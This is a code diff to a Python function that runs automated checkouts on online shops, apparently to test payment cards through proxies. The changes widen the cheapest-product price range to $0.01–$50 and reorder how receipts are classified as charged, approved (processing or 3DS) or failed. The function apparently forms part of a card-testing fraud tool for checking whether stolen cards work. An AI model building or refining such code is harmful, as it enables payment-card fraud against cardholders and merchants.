@@ -1391,12 +1391,12 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                        impersonate=impersonate, user_agent=user_agent)
     
     try:
-        # Step 0 - Find cheapest product (0.5$ to 30$)
+        # Step 0 - Find cheapest product (0.01$ to 50$)
         try:
             title, product_id, variant_id, price = find_cheapest_product(
                 client, shop_url, 
-                min_price=0.5, 
-                max_price=30.0
+                min_price=0.01,  # ← معدل
+                max_price=50.0   # ← معدل
             )
             _ = title, product_id
         except Exception as e:
@@ -1650,7 +1650,13 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 status_code = extract_receipt_status_code(poll_body, receipt_type)
                 result.status_code = status_code
                 
-                # ===== CHARGED =====
+                # ── Handle ProcessingReceipt ──────────────────────────
+                if receipt_type == "ProcessingReceipt":
+                    result.status = CheckStatus.APPROVED
+                    result.status_code = "PROCESSING"
+                    result.receipt_url = checkout_url + "/thank_you"  # ← معدل
+                    return result
+                
                 if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                     result.status = CheckStatus.CHARGED
                     result.status_code = "ORDER_PLACED"
@@ -1663,20 +1669,11 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                         result.receipt_url = checkout_url
                     return result
                 
-                # ===== PROCESSING (مع /thank_you) =====
-                if receipt_type == "ProcessingReceipt":
-                    result.status = CheckStatus.APPROVED
-                    result.status_code = "PROCESSING"
-                    result.receipt_url = checkout_url + "/thank_you"  # 👈 التعديل
-                    return result
-                
-                # ===== 3DS =====
                 if receipt_type == "ActionRequiredReceipt":
                     result.status = CheckStatus.APPROVED
                     result.status_code = "3DS_REQUIRED"
                     return result
                 
-                # ===== FAILED =====
                 if receipt_type == "FailedReceipt":
                     error_code = ""
                     error_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
